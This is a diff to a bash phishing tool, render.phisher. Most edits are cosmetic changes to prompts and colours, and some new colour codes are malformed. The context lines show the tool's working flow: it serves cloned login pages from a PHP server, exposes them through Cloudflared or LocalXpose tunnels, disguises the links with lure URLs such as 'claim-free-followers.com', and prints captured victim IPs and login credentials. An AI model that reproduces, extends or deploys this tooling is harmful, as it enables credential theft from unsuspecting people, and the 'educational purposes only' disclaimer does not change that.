@@ -1,11 +1,5 @@
 #!/bin/bash
 
-##   render.phisher 	: 	Simple Automated Phishing Tool
-##   Author 			: 	render437
-##   Version			: 	1.2.0
-##   Github 			: 	https://github.com/render437/render.phisher
-
-
 __version__="1.2.0"
 
 ## DEFAULT HOST & PORT
@@ -342,13 +336,13 @@ about() {
 		${WHITE} Version: ${__version__}
 
 		${RED} Warning:${RESET}
-		${ORANGE}  This tool is made for educational purposes only. 
-		The author will not be responsible for any misuse of this tool!${RESET}
+		${ORANGEBG}{BLACK}This tool is made for educational purposes only. 
+		The author will not be responsible for any misuse of this tool!${RESETBG}\n"
 
 		${WHITE}00. Main Menu     ${WHITE}99. Exit
 	EOF
 
-	read -p "${WHITE}Select an option:"
+	read -p "\n${WHITE}Select an option:"
 	case $REPLY in 
 		99)
 			msg_exit;;
@@ -364,10 +358,10 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${RED} Do You Want A Custom Port: ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE}" P_ANS
+	read -n1 -p "${WHITE}Do You Want A Custom Port: y/N:${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port[1024-9999]: ${WHITE}" CU_P
+		read -n4 -p "{WHITE}[${WHITE}-${WHITE}]${WHITE} Enter Your Custom 4-digit Port[1024-9999]: ${WHITE}" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
 			echo
@@ -376,16 +370,16 @@ cusport() {
 			{ sleep 2; clear; banner_small; cusport; }
 		fi		
 	else 
-		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
+		echo -ne "\n\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Using Default Port $PORT...${WHITE}\n"
 	fi
 }
 
 ## Setup website and start php server
 setup_site() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	echo -ne "\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Successfully set up PHP server!"${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
@@ -427,7 +421,7 @@ capture_creds() {
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Awaiting login info... ${CYAN}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
 			echo -e "\n\n${GREEN} Victim IP Found !"
@@ -448,9 +442,9 @@ capture_data() {
 start_cloudflared() { 
 	rm .cld.log > /dev/null 2>&1 &
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+	echo -ne "\n\n${CYAN}[${CYAN}-${CYAN}]${CYAN} Waiting for Cloudflare response..."
 
 	if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
@@ -481,10 +475,10 @@ localxpose_auth() {
 	}
 }
 
-## Start LocalXpose (Again...)
+## Start LocalXpose
 start_loclx() {
 	cusport
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${WHITE}[${WHITE}-${WHITE}]${WHITE} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
@@ -543,16 +537,17 @@ tunnel_menu() {
 ## Custom Mask URL
 custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to Mask the URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
-		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://claim-free-followers.com${CYAN})\n"
 		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
 			mask=$mask_url
 			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url:${GREEN} $mask"
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..."
+			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Using the defualt url instead..."
 		fi
 	fi
 }
@@ -591,8 +586,8 @@ custom_url() {
 		processed_url="https://$processed_url"
 	else
 		# echo "[!] No url provided / Regex Not Matched"
-		url="Unable to generate links. Try after turning on hotspot"
-		processed_url="Unable to Short URL"
+		url="Unable to generate links. Try after turning on your hotspot or restarting your system"
+		processed_url="Unable to Shorten URL"
 	fi
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
